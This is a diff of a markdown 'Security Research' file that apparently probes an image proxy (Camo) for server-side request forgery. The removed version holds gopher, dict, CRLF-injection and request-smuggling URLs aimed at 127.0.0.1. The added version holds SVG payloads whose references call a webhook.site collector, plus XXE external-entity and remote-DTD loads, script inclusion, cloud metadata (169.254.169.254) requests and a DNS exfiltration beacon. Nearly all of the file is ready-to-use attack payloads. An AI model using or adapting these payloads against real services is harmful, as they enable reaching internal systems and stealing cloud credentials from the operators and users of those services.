@@ -1,152 +1,213 @@
-# Security Research - v29
+# Security Research - v30
 
-## Protocol & Advanced Attacks
+## SVG-Based SSRF Deep Dive
 
-Testing protocol-level and advanced SSRF techniques.
-
----
-
-### 1) Gopher Protocol
-
-SSRF classic - gopher can craft arbitrary TCP:
-
-![gopher](gopher://127.0.0.1:9000/_GET%20/%20HTTP/1.0%0d%0a%0d%0a)
+SVG files can contain various external references. Testing if Camo processes SVG content.
 
 ---
 
-### 2) Dict Protocol
+### 1) SVG with xlink:href External Image
 
-Dict protocol for port scanning:
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-xlink.gif" width="100" height="100"/>
+</svg>
+```
 
-![dict](dict://127.0.0.1:6379/INFO)
-
----
-
-### 3) LDAP Protocol
-
-![ldap](ldap://127.0.0.1:389/)
+![svg-xlink](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-xlink-test.svg)
 
 ---
 
-### 4) TFTP Protocol
+### 2) SVG with foreignObject
 
-![tftp](tftp://127.0.0.1/test)
+```xml
+<svg xmlns="http://www.w3.org/2000/svg">
+  <foreignObject width="100" height="100">
+    <img src="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-foreign.gif"/>
+  </foreignObject>
+</svg>
+```
 
----
-
-### 5) FTP Protocol
-
-![ftp](ftp://127.0.0.1/)
-
----
-
-### 6) CRLF Injection in URL
-
-Attempt CRLF in path:
-
-![crlf](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/test%0d%0aX-Injected:%20header%0d%0a%0d%0a/crlf.gif)
+![svg-foreign](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-foreign-test.svg)
 
 ---
 
-### 7) HTTP Request Smuggling via URL
+### 3) SVG use Element with External Reference
 
-Attempt smuggling in path:
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <use xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/external.svg#shape"/>
+</svg>
+```
 
-![smuggle](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/test%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/smuggled.gif)
-
----
-
-### 8) Connection: Keep-Alive Pipeline
-
-![keepalive](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/keepalive.gif)
+![svg-use](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-use-test.svg)
 
 ---
 
-### 9) URL with Different Case Scheme
+### 4) SVG with External CSS
 
-![HTTP-case](HTTP://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/http-case.gif)
+```xml
+<svg xmlns="http://www.w3.org/2000/svg">
+  <style>@import url(https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/style.css);</style>
+</svg>
+```
 
-![hTtP-case](hTtP://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/http-mixed.gif)
-
----
-
-### 10) Double Slash Normalization
-
-![doubleslash](https://webhook.site//dfe7c107-9e29-45d2-b866-cf64a684164e//doubleslash.gif)
+![svg-css](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-css-test.svg)
 
 ---
 
-### 11) URL with Backslash in Host
+### 5) SVG with External Font
 
-![backslash-host](https://webhook.site\@127.0.0.1/backslash-host.gif)
+```xml
+<svg xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <font-face font-family="ExternalFont">
+      <font-face-uri xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/font.woff"/>
+    </font-face>
+  </defs>
+</svg>
+```
 
----
-
-### 12) Tab Character in Host
-
-![tab-host](https://webhook	.site/dfe7c107-9e29-45d2-b866-cf64a684164e/tab-host.gif)
-
----
-
-### 13) Semicolon as Path Separator
-
-![semicolon](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e;@127.0.0.1/semicolon.gif)
+![svg-font](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-font-test.svg)
 
 ---
 
-### 14) IPv4-in-IPv6 Format
+### 6) SVG with Script (XSS + SSRF)
 
-![ipv4-in-ipv6](http://[::ffff:127.0.0.1]/ipv4-in-ipv6.gif)
+```xml
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/script.js"/>
+</svg>
+```
 
----
-
-### 15) Long URL Overflow Test
-
-Extremely long path:
-
-![longurl](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/longurl.gif)
+![svg-script](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-script-test.svg)
 
 ---
 
-### 16) URL with Username Only (No Password)
+### 7) SVG with ENTITY External Reference (XXE)
 
-![user-only](https://user@webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/user-only.gif)
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/xxe">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&xxe;</text>
+</svg>
+```
 
----
-
-### 17) Percent-Encoded Scheme
-
-![encoded-scheme](%68%74%74%70%73://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/encoded-scheme.gif)
-
----
-
-### 18) Unicode Normalization (NFC vs NFD)
-
-![nfc](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/café-nfc.gif)
-![nfd](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/cafe\u0301-nfd.gif)
+![svg-xxe](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-xxe-test.svg)
 
 ---
 
-### 19) HTTP/2 Pseudo-Header Injection
+### 8) SVG with Parameter Entity (XXE)
 
-![h2-inject](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/:path/h2-inject.gif)
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY % remote SYSTEM "https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/evil.dtd">
+  %remote;
+]>
+<svg xmlns="http://www.w3.org/2000/svg"></svg>
+```
+
+![svg-param](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-param-test.svg)
 
 ---
 
-### 20) URL Fragment with Query String
+### 9) Inline SVG Data URI with External Ref
 
-![fragment-query](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/test.gif?foo=bar#baz?internal=http://127.0.0.1)
+![data-svg](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSBocmVmPSJodHRwczovL3dlYmhvb2suc2l0ZS9lZmRhMzBjNi0xNzRiLTRjYjMtOThlNy0wMzdmMzlkMTlkNzIvZGF0YS1zdmcuZ2lmIi8+PC9zdmc+)
+
+---
+
+### 10) GitHub Raw SVG URL
+
+Testing if GitHub serves raw SVG with external references:
+
+![raw-svg](https://raw.githubusercontent.com/jessi2000/progsjessi/main/test.svg)
+
+---
+
+### 11) SVG with feImage Filter
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <defs>
+    <filter id="f1">
+      <feImage xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/feimage.gif"/>
+    </filter>
+  </defs>
+  <rect filter="url(#f1)" width="100" height="100"/>
+</svg>
+```
+
+![svg-feimage](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-feimage-test.svg)
+
+---
+
+### 12) SVG Animation with External Value
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image>
+    <animate attributeName="xlink:href" values="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/anim.gif" dur="1s"/>
+  </image>
+</svg>
+```
+
+![svg-animate](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-animate-test.svg)
+
+---
+
+### 13) SVG Pattern with External Image
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <defs>
+    <pattern id="p1">
+      <image xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/pattern.gif"/>
+    </pattern>
+  </defs>
+</svg>
+```
+
+![svg-pattern](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-pattern-test.svg)
+
+---
+
+### 14) SVG with Internal IP in xlink
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://127.0.0.1:80/internal" width="100" height="100"/>
+</svg>
+```
+
+![svg-internal](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-internal-test.svg)
+
+---
+
+### 15) SVG with Cloud Metadata in xlink
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
+</svg>
+```
+
+![svg-metadata](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-metadata-test.svg)
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v29-dns.dfe7c107-9e29-45d2-b866-cf64a684164e.dnshook.site/dns.gif)
+![dns](https://v30-dns.efda30c6-174b-4cb3-98e7-037f39d19d72.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/v29-canary.gif)
+![canary](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/v30-canary.gif)
 
 ---
 
-*v29 - Protocol & advanced attacks*
+*v30 - SVG-based SSRF deep dive*
